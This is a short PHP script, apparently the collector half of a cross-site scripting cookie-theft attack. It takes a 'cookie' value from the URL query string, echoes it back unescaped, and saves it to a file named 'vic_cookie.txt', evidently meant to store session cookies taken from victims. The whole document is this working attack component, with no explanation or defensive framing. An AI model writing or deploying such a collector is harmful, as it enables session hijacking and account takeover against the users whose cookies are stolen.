<?php

   $cookie=$_GET['cookie'];
   $handle=fopen("vic_cookie.txt","w");
echo $cookie;
   fwrite($handle,$cookie);
   fclose($handle);



?>
